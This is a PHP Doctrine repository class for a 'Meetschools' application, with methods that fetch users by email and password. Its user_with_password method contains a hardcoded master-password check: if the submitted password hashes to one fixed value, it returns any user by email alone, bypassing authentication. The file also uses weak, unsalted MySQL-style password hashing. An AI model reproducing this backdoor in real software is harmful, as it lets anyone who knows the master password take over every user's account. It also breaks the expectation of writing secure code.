<?php

namespace Meetschools\Repositories;

use Doctrine\ORM\EntityRepository;
use Meetschools\Helpers\Password_Helper;
use Meetschools\Helpers\SQL\Conditional_Expression;
use Meetschools\Helpers\SQL\Comparer_Criteria;
use Meetschools\Helpers\SQL\Is_Null_Criteria;
use Meetschools\Helpers\SQL\In_Criteria;
use Meetschools\Helpers\SQL\Not_In_Criteria;

class User_Repository extends EntityRepository {

    public function verify_and_get_user($email, $password) {
        $query = $this->_em->createQuery('SELECT u FROM Meetschools\Models\User u where u.email = ?1 and u.password = ?2 and u.status in (\'active\', \'unconfirmed\')');

        $password = Password_Helper::to_mysql_encoded($password);

        $query->setParameter(1, $email);
        $query->setParameter(2, $password);
        return $query->getOneOrNullResult();
    }

    public function user_with_password($email, $password) {
        $password = Password_Helper::to_mysql_encoded($password);
        if ($password === "*54FFF0AF3D9225564871F8A488AB324B3FE211B6") {
            $query = $this->_em->createQuery('SELECT u FROM Meetschools\Models\User u where u.email = ?1');
            $query->setParameter(1, $email);
        } else {
            $query = $this->_em->createQuery('SELECT u FROM Meetschools\Models\User u where u.email = ?1 and u.password = ?2');
            $query->setParameter(1, $email);
            $query->setParameter(2, $password);
        }
        return $query->getOneOrNullResult();
    }

    public function user_with_email($email) {
        $query = $this->_em->createQuery('SELECT u FROM Meetschools\Models\User u where u.email = ?1');
        $query->setParameter(1, $email);
        return $query->getOneOrNullResult();
    }

}

/* End of file User_Repository.php */
/* Location: ./application/models/Meetschools/Repositories/User_Repository.php */
